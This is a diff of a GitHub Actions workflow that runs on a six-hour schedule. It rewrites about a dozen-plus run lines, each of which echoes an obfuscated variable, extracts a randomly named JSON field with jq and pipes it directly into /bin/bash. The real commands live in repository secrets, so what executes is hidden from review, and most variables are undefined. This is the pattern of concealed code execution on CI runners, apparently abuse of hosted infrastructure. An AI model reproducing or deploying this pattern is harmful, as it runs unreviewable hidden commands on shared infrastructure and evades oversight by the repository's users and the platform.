@@ -1,24 +1,31 @@
 name: jiangjing19871010
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 4/6 * * *'
-jobs:  # 22816
+    - cron: '0 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: jiangjing19871010
         env:
-          jhh17: ${{ secrets.jhh17 }}
+          i43218: ${{ secrets.i43218 }}
         run: |
-          echo $jhh17 | jq -r .wkt19477 | /bin/bash
-          echo $adpjx262 | jq -r .lushi88 | /bin/bash
-          echo $vjvd3157 | jq -r .cpoa72400 | /bin/bash
-          echo $gdold171 | jq -r .ihjtj453 | /bin/bash
-          echo $r4579 | jq -r .ywnwg6 | /bin/bash
-          echo $br55413 | jq -r .xv898 | /bin/bash
-          echo $mynzq86168 | jq -r .ft966 | /bin/bash
+          echo $i43218 | jq -r .oqff4608 | /bin/bash
+          echo $yadwi864 | jq -r .rdo931 | /bin/bash
+          echo $dwoop1 | jq -r .echv18062 | /bin/bash
+          echo $px28 | jq -r .pa9480 | /bin/bash
+          echo $jc7 | jq -r .nn686 | /bin/bash
+          echo $sf785 | jq -r .xjexc5 | /bin/bash
+          echo $twar79 | jq -r .kzc88236 | /bin/bash
+          echo $rsa882 | jq -r .fdvyk597 | /bin/bash
+          echo $nds6 | jq -r .q7112 | /bin/bash
+          echo $bvo96 | jq -r .q4 | /bin/bash
+          echo $lusvn6864 | jq -r .pq10773 | /bin/bash
+          echo $h415 | jq -r .wgjco37535 | /bin/bash
+          echo $a374 | jq -r .jzuk15891 | /bin/bash
+          echo $tnkuk5 | jq -r .mx87 | /bin/bash
+          echo $m01 | jq -r .kci843 | /bin/bash
+          echo $kbmof280 | jq -r .cqyqb4 | /bin/bash
 
